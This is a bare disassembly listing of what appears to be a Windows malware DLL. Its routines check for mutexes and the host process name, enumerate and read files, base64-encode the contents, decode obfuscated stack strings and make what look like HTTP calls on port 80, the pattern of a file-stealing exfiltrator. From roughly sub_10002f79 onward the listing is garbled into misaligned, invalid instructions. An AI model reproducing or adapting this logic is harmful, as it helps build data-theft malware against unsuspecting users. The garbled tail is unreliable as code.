stosw [ edi ]
stosb [ edi ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
sub eax 0x0
je r-xdata
push 0x7d0
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
test eax eax
jne r-xdata
dec eax
jne r-xdata
xor eax eax
push esi
mov esi [ CloseHandle@IAT ]
push [ rw-data ]
call esi
push [ rw-data ]
call esi
pop esi
call sub_100021d7
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
push 0x104
push eax
push [ rw-data ]
call [ GetModuleFileNameA@IAT ]
test eax eax
je r-xdata
push 0x27
call ordinal_4
pop ecx
jmp r-xdata
and [ ebp + 0x8 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
call sub_100015f7
test eax eax
pop ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x160
push eax
lea eax [ ebp - 0x104 ]
push eax
call [ strstr@IAT ]
pop ecx
test eax eax
pop ecx
je r-xdata
push 0x1
pop eax
jmp r-xdata
leave
retn 0xc
sub_100021d7
push ebp
mov ebp esp
sub esp 0x34
and [ ebp - 0x34 ] 0x0
push ebx
push esi
push edi
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x33 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x4 ]
push eax
call sub_100015f7
test eax eax
pop ecx
jne r-xdata
xor eax eax
and [ ebp - 0x14 ] al
lea edi [ ebp - 0x13 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x14 ]
push 0xa
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x19 ]
push eax
call [ _itoa@IAT ]
mov esi rw-data
push 0x10
lea eax [ ebp - 0x34 ]
push esi
push eax
call [ strncpy@IAT ]
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
call strcat
add esp 0x20
mov edi 0x20000
push esi
mov esi [ OpenMutexA@IAT ]
push 0x1
push edi
call esi
test eax eax
je r-xdata
mov ebx [ GetLastError@IAT ]
call ebx
cmp eax 0x2
jne r-xdata
push eax
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x34 ]
push eax
push 0x1
push edi
call esi
test eax eax
jne r-xdata
call ebx
cmp eax 0x2
jne r-xdata
push [ ebp - 0x4 ]
call [ free@IAT ]
pop ecx
lea eax [ ebp - 0x34 ]
push eax
push 0x1
push 0x0
call [ CreateMutexA@IAT ]
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_100022a2
push ebp
mov ebp esp
sub esp 0x168
or [ ebp - 0x20 ] 0xffffffff
and [ ebp - 0x8 ] 0x0
or [ ebp - 0x18 ] 0xffffffff
push ebx
push esi
mov esi [ malloc@IAT ]
push edi
mov edi 0x100
push edi
call esi
mov ebx eax
pop ecx
test ebx ebx
mov [ ebp - 0x1c ] ebx
jne r-xdata
push edi
push 0x0
push ebx
call sub_1000d316
mov eax [ ebp + 0x8 ]
push 0xff
add eax 0x42e
push eax
push ebx
call [ strncpy@IAT ]
push ebx
call strlen
mov edi 0x800
mov [ ebp - 0x28 ] eax
push edi
call esi
add esp 0x20
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
push [ ebp - 0x1c ]
mov esi [ free@IAT ]
call esi
cmp [ ebp - 0x14 ] 0x0
pop ecx
je r-xdata
push edi
push 0x0
push eax
call sub_1000d316
push 0x140
lea eax [ ebp - 0x168 ]
push 0x0
push eax
call sub_1000d316
mov edi 0x104
push edi
call esi
push edi
mov [ ebp - 0xc ] eax
call esi
add esp 0x20
cmp [ ebp - 0xc ] 0x0
mov ebx eax
mov [ ebp - 0x24 ] ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov eax [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call esi
pop ecx
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
push ebx
call [ free@IAT ]
pop ecx
push [ ebp - 0xc ]
call [ free@IAT ]
pop ecx
push edi
push 0x0
push [ ebp - 0xc ]
call sub_1000d316
push edi
push 0x0
push ebx
call sub_1000d316
add esp 0x18
push edi
push ebx
push rw-data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0xffffffff
je r-xdata
and [ ebp - 0x10 ] 0x0
and [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
mov ebx rw-data
add eax 0x194
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
push edi
push [ ebp - 0xc ]
add eax 0x194
push eax
lea eax [ ebp - 0x18 ]
push ebx
push eax
call sub_10002669
add esp 0x14
test eax eax
je r-xdata
push edi
lea eax [ ebp - 0x18 ]
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push [ ebp - 0x24 ]
push eax
call sub_10002669
add esp 0x14
cmp [ ebp - 0x18 ] 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x8 ]
push 0x0
push ecx
push 0x800
push [ ebp - 0x14 ]
push eax
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1 ] 0x1
push edi
push ebx
push rw-data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push [ ebp - 0xc ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp + 0x8 ] eax
je r-xdata
mov ebx [ ebp - 0x24 ]
push [ ebp + 0x8 ]
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x8 ]
cmp eax 0x5dc
jae r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
cmp [ ebp - 0x10 ] 0xa
jb r-xdata
mov eax [ ebp + 0x8 ]
push edi
push [ ebp - 0xc ]
add eax 0x194
push eax
lea eax [ ebp - 0x18 ]
push ebx
push eax
call sub_10002669
add esp 0x14
test eax eax
je r-xdata
push 0x800
push 0x0
push [ ebp - 0x14 ]
call sub_1000d316
add esp 0xc
lea eax [ eax + eax + 0x9 ]
push eax
call esi
mov esi eax
pop ecx
test esi esi
je r-xdata
inc [ ebp - 0x10 ]
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
mov esi [ malloc@IAT ]
mov eax [ ebp - 0x8 ]
lea eax [ eax + eax + 0x9 ]
push eax
push 0x0
push esi
call sub_1000d316
push ebx
call strlen
push eax
push ebx
push esi
call [ strncpy@IAT ]
push ebx
call strlen
add [ ebp - 0x8 ] 0x6
add eax esi
push eax
push [ ebp - 0x14 ]
push [ ebp - 0x8 ]
call sub_1000256d
push esi
call strlen
mov [ ebp - 0x8 ] eax
mov [ esi + eax ] 0x25
mov eax [ ebp - 0x8 ]
push rw-data
mov [ esi + eax + 0x1 ] 0x25
mov eax [ ebp - 0x8 ]
and [ esi + eax + 0x2 ] 0x0
add [ ebp - 0x8 ] 0x2
push [ ebp - 0x8 ]
push esi
push [ ebp - 0x28 ]
push [ ebp - 0x1c ]
call sub_10002d02
add esp 0x44
test eax eax
ja r-xdata
push esi
call [ free@IAT ]
pop ecx
and [ ebp - 0x20 ] 0x0
sub_1000256d
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
push esi
mov esi [ ebp + 0x10 ]
jle r-xdata
push [ ebp + 0xc ]
call strlen
pop ecx
mov [ ebp + 0x8 ] eax
pop esi
leave
retn
push ebx
push edi
push 0x1
pop edi
lea eax [ edi + 0x1 ]
cmp eax [ ebp + 0x8 ]
jge r-xdata
mov al [ edi + eax ]
mov [ ebp + 0x13 ] al
mov al [ ebp - 0x1 ]
and al 0x3f
mov [ ebp - 0x8 ] al
mov al bl
shr al 0x2
push eax
call sub_10002643
mov [ esi ] al
mov al [ ebp + 0x13 ]
and bl 0x3
inc esi
shl bl 0x4
shr al 0x4
or bl al
push ebx
call sub_10002643
mov [ esi ] al
pop ecx
inc esi
cmp edi [ ebp + 0x8 ]
pop ecx
jge r-xdata
mov eax [ ebp + 0xc ]
mov al [ edi + eax + 0x1 ]
mov [ ebp - 0x1 ] al
mov [ esi ] 0x3d
mov al [ ebp + 0x13 ]
mov cl [ ebp - 0x1 ]
and al 0xf
shl al 0x2
shr cl 0x6
or al cl
push eax
call sub_10002643
pop ecx
mov [ esi ] al
jmp r-xdata
mov [ esi ] 0x3d
push [ ebp - 0x8 ]
call sub_10002643
pop ecx
mov [ esi ] al
jmp r-xdata
lea eax [ edi + 0x1 ]
inc esi
cmp eax [ ebp + 0x8 ]
jge r-xdata
mov eax [ ebp + 0xc ]
and [ ebp + 0x13 ] 0x0
and [ ebp - 0x1 ] 0x0
cmp edi [ ebp + 0x8 ]
mov bl [ eax + edi - 0x1 ]
jge r-xdata
pop edi
pop ebx
add edi 0x3
inc esi
lea eax [ edi - 0x1 ]
cmp eax [ ebp + 0x8 ]
jl r-xdata
sub_10002643
mov al [ esp + 0x4 ]
cmp al 0x1a
jae r-xdata
cmp al 0x34
jae r-xdata
add eax 0x41
retn
cmp al 0x3e
jae r-xdata
add eax 0x47
retn
setne al
dec eax
and al 0xfc
add eax 0x2f
retn
sub eax 0x4
retn
sub_10002669
push ebp
mov ebp esp
sub esp 0x144
push ebx
push esi
mov esi 0x104
push edi
push esi
mov [ ebp - 0x4 ] 0x12
call [ malloc@IAT ]
mov ebx eax
xor edi edi
cmp ebx edi
pop ecx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
push 0x140
lea eax [ ebp - 0x144 ]
push edi
push eax
call sub_1000d316
push esi
push edi
push ebx
call sub_1000d316
mov esi [ ebp + 0x8 ]
add esp 0x18
mov eax [ esi ]
cmp eax 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x144 ]
push ecx
push eax
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
push [ ebp + 0xc ]
push ebx
call strcpy
mov edi rw-data
push edi
push ebx
call strcat
push [ ebp + 0x10 ]
push ebx
call strcat
add esp 0x18
lea eax [ ebp - 0x144 ]
push eax
push ebx
call [ FindFirstFileA@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
push [ esi ]
mov [ ebp - 0x4 ] 0x12
call [ FindClose@IAT ]
or [ esi ] 0xffffffff
lea eax [ ebp - 0x118 ]
push eax
call strlen
pop ecx
mov ecx [ ebp + 0x18 ]
lea edx [ ecx - 0x1 ]
cmp eax edx
jbe r-xdata
lea eax [ ebp - 0x118 ]
mov [ esi ] ebx
push eax
call strlen
pop ecx
mov ecx [ ebp + 0x18 ]
dec ecx
cmp eax ecx
jbe r-xdata
mov esi [ ebp + 0x14 ]
push ecx
push edi
push esi
call sub_1000d316
push [ ebp + 0xc ]
push esi
call strcpy
push rw-data
push esi
call strcat
lea eax [ ebp - 0x118 ]
push eax
push esi
call strcat
add esp 0x24
mov [ ebp - 0x4 ] edi
jmp r-xdata
push [ esi ]
mov [ ebp - 0x4 ] 0x2
push [ ebp + 0xc ]
push [ ebp + 0x14 ]
call strcpy
push edi
push [ ebp + 0x14 ]
call strcat
lea eax [ ebp - 0x118 ]
push eax
push [ ebp + 0x14 ]
call strcat
add esp 0x18
and [ ebp - 0x4 ] 0x0
mov [ esi ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0x2
push ebx
jmp r-xdata
call [ FindClose@IAT ]
jmp r-xdata
sub_100027d4
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x2c ] eax
or [ ebp - 0x34 ] 0xffffffff
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4 ] 0x1
mov edi rw-data
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_100043d2
mov esi 0x100
push esi
call [ malloc@IAT ]
add esp 0x10
mov ebx eax
mov [ ebp - 0x2c ] ebx
test ebx ebx
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_10002892
jmp r-xdata
push esi
push 0x0
push ebx
call sub_1000d316
push 0xff
mov eax [ ebp + 0x8 ]
add eax 0x32f
push eax
push ebx
call [ strncpy@IAT ]
push ebx
call strlen
mov [ ebp - 0x1c ] eax
push edi
push 0x1
push 0x3
push [ ebp - 0x28 ]
push [ ebp - 0x20 ]
push ebx
call sub_100028d6
add esp 0x34
mov [ ebp - 0x30 ] eax
test eax eax
jl r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x34 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
and [ ebp - 0x34 ] 0x0
sub_10002892
cmp [ ebp - 0x20 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
push [ ebp - 0x20 ]
call [ free@IAT ]
pop ecx
and [ ebp - 0x20 ] 0x0
retn
push ebx
call [ free@IAT ]
pop ecx
and [ ebp - 0x2c ] 0x0
sub_100028d6
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x90
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x38 ] 0x32
mov [ ebp - 0x37 ] 0x10
mov [ ebp - 0x36 ] 0x5
mov [ ebp - 0x35 ] 0x16
mov [ ebp - 0x34 ] 0x13
mov [ ebp - 0x33 ] 0x13
mov [ ebp - 0x32 ] 0x1e
mov [ ebp - 0x31 ] 0x50
mov [ ebp - 0x30 ] 0x4b
mov [ ebp - 0x2f ] 0x51
mov [ ebp - 0x2e ] 0x4f
mov [ ebp - 0x2d ] 0x5f
mov [ ebp - 0x2c ] 0x57
mov [ ebp - 0x2b ] 0x1c
mov [ ebp - 0x2a ] 0x10
mov [ ebp - 0x29 ] 0x12
mov [ ebp - 0x28 ] 0xf
mov [ ebp - 0x27 ] 0x1e
mov [ ebp - 0x26 ] 0xb
mov [ ebp - 0x25 ] 0x16
mov [ ebp - 0x24 ] 0x1d
mov [ ebp - 0x23 ] 0x13
mov [ ebp - 0x22 ] 0x1a
mov [ ebp - 0x21 ] 0x44
mov [ ebp - 0x20 ] 0x56
mov [ ebp - 0x1f ] bl
mov [ ebp - 0x4 ] ebx
push 0x1
pop edi
mov [ ebp - 0x4 ] edi
call sub_10002f79
test eax eax
jne r-xdata
mov eax [ ebp + 0x14 ]
imul eax eax 0x3e8
mov [ ebp - 0x90 ] eax
push eax
mov esi [ Sleep@IAT ]
call esi
lea eax [ ebp - 0x38 ]
push eax
call sub_100075ee
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x80 ] ebx
push edi
push rw-data
lea eax [ ebp - 0x80 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
push [ ebp + 0x8 ]
call sub_1000420e
add esp 0x18
test eax eax
jne r-xdata
mov [ ebp - 0x50 ] 0xffffe4a6
jmp r-xdata
mov [ ebp - 0x6c ] ebx
mov [ ebp - 0x74 ] bl
mov [ ebp - 0x88 ] bl
mov edi rw-data
mov [ ebp - 0x50 ] 0xffffe4a7
jmp r-xdata
mov [ ebp - 0x4 ] ebx
call sub_10002c5d
jmp r-xdata
inc [ ebp - 0x6c ]
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x38 ]
push eax
call [ rw-data ]
mov [ ebp - 0x58 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x50 ] 0xffffe4a5
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x50 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push ebx
push ebx
push 0x3
push edi
push edi
push 0x50
push [ ebp + 0x8 ]
push eax
call [ rw-data ]
mov [ ebp - 0x54 ] eax
cmp eax ebx
jne r-xdata
call sub_100041e6
push eax
call esi
mov [ ebp - 0x50 ] 0xffffe4a4
jmp r-xdata
push ebx
push 0x4000000
push ebx
push ebx
push rw-data
push [ ebp - 0x44 ]
push rw-data
push eax
call [ rw-data ]
mov [ ebp - 0x40 ] eax
cmp eax ebx
jne r-xdata
push [ ebp - 0x58 ]
call [ rw-data ]
mov [ ebp - 0x58 ] ebx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push eax
call [ rw-data ]
mov [ ebp - 0x98 ] eax
cmp eax ebx
jne r-xdata
push [ ebp - 0x58 ]
call [ rw-data ]
mov [ ebp - 0x58 ] ebx
push [ ebp - 0x54 ]
call [ rw-data ]
mov [ ebp - 0x54 ] ebx
jmp r-xdata
call sub_100041e6
push eax
call esi
jmp r-xdata
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x68 ] ebx
lea eax [ ebp - 0x68 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x40 ]
call sub_10003417
add esp 0xc
mov [ ebp - 0x64 ] eax
cmp eax ebx
jg r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0xa0 ] eax
push [ ebp - 0x58 ]
call [ rw-data ]
mov [ ebp - 0x58 ] ebx
push [ ebp - 0x54 ]
call [ rw-data ]
mov [ ebp - 0x54 ] ebx
push [ ebp - 0x40 ]
call [ rw-data ]
mov [ ebp - 0x40 ] ebx
push ebx
call sub_10007578
pop ecx
dec eax
dec eax
neg eax
sbb eax eax
inc eax
mov [ ebp - 0x9c ] eax
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x6c ]
cmp eax [ ebp + 0x18 ]
jb r-xdata
cmp [ ebp - 0x54 ] ebx
je r-xdata
mov [ ebp - 0x50 ] 0xffffe4a3
jmp r-xdata
call sub_10006e05
test eax eax
je r-xdata
cmp [ ebp - 0x40 ] ebx
je r-xdata
push [ ebp - 0x54 ]
call [ rw-data ]
mov [ ebp - 0x54 ] ebx
cmp [ ebp - 0x74 ] bl
jne r-xdata
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x84 ] ebx
mov eax [ ebp - 0x4c ]
mov [ ebp - 0x3c ] eax
lea ecx [ ebp - 0x84 ]
push ecx
lea ecx [ ebp - 0x48 ]
push ecx
push ebx
lea ecx [ ebp - 0x60 ]
push ecx
push [ ebp - 0x68 ]
push eax
call sub_1000359e
add esp 0x18
test eax eax
jne r-xdata
push [ ebp - 0x40 ]
call [ rw-data ]
mov [ ebp - 0x40 ] ebx
cmp [ ebp - 0x88 ] bl
jne r-xdata
call sub_100042f0
mov [ ebp - 0x74 ] al
mov [ ebp - 0x7c ] ebx
mov [ ebp - 0x94 ] ebx
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x78 ] ebx
lea ecx [ ebp - 0x78 ]
push ecx
lea ecx [ ebp - 0x94 ]
push ecx
lea ecx [ ebp - 0x7c ]
push ecx
push [ ebp + 0x1c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
push eax
push [ ebp - 0x58 ]
call sub_1000376d
add esp 0x24
mov [ ebp - 0x50 ] eax
cmp [ ebp - 0x78 ] ebx
je r-xdata
mov [ ebp - 0x50 ] 0xffffe4a2
jmp r-xdata
cmp [ ebp - 0x6c ] 0x1
jne r-xdata
cmp eax ebx
jl r-xdata
cmp [ ebp + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x1c ] eax
push [ ebp - 0x94 ]
push [ ebp - 0x7c ]
push [ ebp + 0x1c ]
push [ ebp - 0x84 ]
push eax
push [ ebp - 0x58 ]
call sub_10003edb
add esp 0x18
mov [ ebp - 0x8c ] eax
mov [ ebp - 0x6c ] ebx
mov [ ebp - 0x88 ] 0x1
sub_10002c5d
cmp [ ebp - 0x44 ] ebx
je r-xdata
mov esi [ free@IAT ]
push [ ebp - 0x44 ]
mov esi [ free@IAT ]
call esi
pop ecx
mov [ ebp - 0x44 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x5c ]
call esi
pop ecx
mov [ ebp - 0x5c ] ebx
cmp [ ebp - 0x5c ] ebx
je r-xdata
cmp [ ebp - 0x3c ] ebx
je r-xdata
push [ ebp - 0x1c ]
call esi
pop ecx
mov [ ebp - 0x1c ] ebx
cmp [ ebp - 0x58 ] ebx
je r-xdata
push [ ebp - 0x3c ]
call esi
pop ecx
mov [ ebp - 0x3c ] ebx
cmp [ ebp - 0x54 ] ebx
je r-xdata
push [ ebp - 0x58 ]
call [ rw-data ]
mov [ ebp - 0x58 ] ebx
cmp [ ebp - 0x40 ] ebx
je r-xdata
push [ ebp - 0x54 ]
call [ rw-data ]
mov [ ebp - 0x54 ] ebx
call sub_10002f61
retn
push [ ebp - 0x40 ]
call [ rw-data ]
mov [ ebp - 0x40 ] ebx
sub_10002d02
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x4c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x3c ] 0x32
mov [ ebp - 0x3b ] 0x10
mov [ ebp - 0x3a ] 0x5
mov [ ebp - 0x39 ] 0x16
mov [ ebp - 0x38 ] 0x13
mov [ ebp - 0x37 ] 0x13
mov [ ebp - 0x36 ] 0x1e
mov [ ebp - 0x35 ] 0x50
mov [ ebp - 0x34 ] 0x4b
mov [ ebp - 0x33 ] 0x51
mov [ ebp - 0x32 ] 0x4f
mov [ ebp - 0x31 ] 0x5f
mov [ ebp - 0x30 ] 0x57
mov [ ebp - 0x2f ] 0x1c
mov [ ebp - 0x2e ] 0x10
mov [ ebp - 0x2d ] 0x12
mov [ ebp - 0x2c ] 0xf
mov [ ebp - 0x2b ] 0x1e
mov [ ebp - 0x2a ] 0xb
mov [ ebp - 0x29 ] 0x16
mov [ ebp - 0x28 ] 0x1d
mov [ ebp - 0x27 ] 0x13
mov [ ebp - 0x26 ] 0x1a
mov [ ebp - 0x25 ] 0x44
mov [ ebp - 0x24 ] 0x56
mov [ ebp - 0x23 ] bl
mov [ ebp - 0x20 ] 0x40
mov [ ebp - 0x1f ] 0x5a
mov [ ebp - 0x1e ] 0x5a
mov [ ebp - 0x1d ] bl
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x3c ]
push eax
call sub_100075ee
lea eax [ ebp - 0x20 ]
push eax
call sub_100075ee
pop ecx
pop ecx
call sub_10002f79
test eax eax
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
call strlen
mov [ ebp - 0x5c ] eax
mov ecx [ ebp + 0xc ]
lea esi [ eax + ecx ]
mov [ ebp - 0x48 ] esi
lea eax [ esi + 0x1 ]
push eax
call [ malloc@IAT ]
pop ecx
pop ecx
mov edi eax
mov [ ebp - 0x1c ] edi
cmp edi ebx
jne r-xdata
mov [ ebp - 0x40 ] 0xffffe4a6
jmp r-xdata
lea eax [ esi + 0x1 ]
push eax
push ebx
push edi
call sub_1000d316
push esi
push [ ebp + 0x8 ]
push edi
call [ strncpy@IAT ]
push edi
call strlen
sub esi eax
push esi
lea eax [ ebp - 0x20 ]
push eax
push edi
call [ strncat@IAT ]
add esp 0x28
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x3c ]
push eax
call [ rw-data ]
mov [ ebp - 0x44 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x40 ] 0xffffe4a1
jmp r-xdata
mov [ ebp - 0x4 ] ebx
call sub_10002f24
jmp r-xdata
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x4c ] ebx
lea ecx [ ebp - 0x4c ]
push ecx
lea ecx [ ebp - 0x58 ]
push ecx
lea ecx [ ebp - 0x50 ]
push ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
push esi
push edi
push eax
call sub_1000376d
add esp 0x24
mov [ ebp - 0x40 ] eax
cmp eax ebx
jge r-xdata
mov [ ebp - 0x40 ] 0xffffe4a4
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x40 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push ebx
call sub_10007578
pop ecx
dec eax
dec eax
neg eax
sbb eax eax
inc eax
mov [ ebp - 0x54 ] eax
cmp eax 0x1
jne r-xdata
call sub_10006e05
test eax eax
je r-xdata
push [ ebp - 0x44 ]
call [ rw-data ]
mov [ ebp - 0x44 ] ebx
call sub_100042f0
cmp al 0x1
jne r-xdata
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x3c ]
push eax
call [ rw-data ]
mov [ ebp - 0x44 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x1 ]
push eax
push ebx
push edi
call sub_1000d316
push esi
push [ ebp + 0x8 ]
push edi
call [ strncpy@IAT ]
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x50 ]
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
push edi
push [ ebp - 0x44 ]
call sub_1000376d
add esp 0x3c
mov [ ebp - 0x40 ] eax
sub_10002f79
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xb0
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x84 ] 0x8
mov [ ebp - 0x83 ] 0x16
mov [ ebp - 0x82 ] 0x11
mov [ ebp - 0x81 ] 0x16
mov [ ebp - 0x80 ] 0x11
mov [ ebp - 0x7f ] 0x1a
mov [ ebp - 0x7e ] 0xb
mov [ ebp - 0x7d ] 0x51
mov [ ebp - 0x7c ] 0x1b
mov [ ebp - 0x7b ] 0x13
mov [ ebp - 0x7a ] 0x13
xor ebx ebx
mov [ ebp - 0x79 ] bl
mov [ ebp - 0xc0 ] 0x36
mov [ ebp - 0xbf ] 0x11
mov [ ebp - 0xbe ] 0xb
mov [ ebp - 0xbd ] 0x1a
mov [ ebp - 0xbc ] 0xc
mov [ ebp - 0x80000bb ] 0x11
les eax [ ebp - 0xba ]
sbb al dh
test [ edi - 0x1 ] eax
sub_1000304d
dec [ ebx ]
mov [ ebp - 0xb1 ] 0x3e
mov [ ebp - 0xb0 ] bl
salc
inc ebp
les esi [ esi ]
mov [ ebp - 0x3b ] 0x11
mov [ ebp - 0x3a ] 0xb
xchg [ ebp - 0x39 ] al
sbb al dh
inc ebp
enter 0xc60d 0x45
leave
adc esi eax
inc ebp
0xc61a
sub_10003122
push ebp
mov [ 0xffffffffa345c611 ] al
sbb eax esi
inc ebp
xchg esi eax
sub eax 0x1aa545c6
mov [ ebp - 0x5a ] 0xe
mov [ ebp - 0x59 ] 0xa
mov [ ebp - 0x58 ] 0x1a
mov [ ebp - 0x57 ] 0xc
mov [ ebp - 0x56 ] 0xb
mov [ ebp - 0x55 ] 0x3e
mov [ ebp - 0x54 ] bl
mov [ ebp - 0x2c ] 0x37
mov [ ebp - 0x2b ] 0xb
mov [ ebp - 0x2a ] 0xb
mov [ ebp - 0x29 ] 0xf
mov [ ebp - 0x28 ] 0x26
mov [ ebp - 0x27 ] 0xa
mov [ ebp - 0x26 ] 0x1a
mov [ ebp - 0x25 ] 0xd
mov [ ebp - 0x24 ] 0x6
mov [ ebp - 0x3 ] 0x36
mov [ ebp - 0x22 ] 0x11
mov [ ebp - 0x21 ] 0x19
mov [ ebp - 0x20 ] 0x10
mov [ ebp - 0x1f ] 0x3e
mov [ ebp - 0x1e ] bl
mov [ ebp - 0x74 ] 0x36
mov [ ebp - 0x77 ] 0x11
mov [ ebp - 0x76 ] 0xb
mov [ ebp - 0x75 ] 0x1a
mov [ ecx - 0x74 ] 0xd
mov [ ebp - 0x73 ] 0x11
xchg [ ebp - 0x72 ] al
sbb al dh
inc ebp
into
or eax esi
inc ebp
nop
cmp al 0xc6
inc edi
xchg ecx eax
adc eax esi
inc ebp
xchg edx eax
adc dh al
inc ebp
xchg ebx eax
or al 0xc6
inc ebp
xchg esp eax
sbb al dh
inc ebp
xchg ebp eax
aaa
mov [ ebp - 0x6a ] 0x1e
retn 0x9745
sub_100031c6
adc esi eax
inc ebp
cwde
sbb eax esi
inc ebp
cdq
adc eax esi
inc ebp
0x9b5d881a 0x85c6
push 0x36ffffff
mov [ ebp - 0x97 ] 0x11
mov [ ebp - 0x96 ] 0xb
mov [ ebp - 0x1495 ] 0x1a
mov [ ebp - 0x94 ] 0xd
mov [ ebp - 0x20000b3 ] 0x11
mov [ ebp - 0x92 ] 0x1a
mov [ ebp - 0x93 ] 0xb
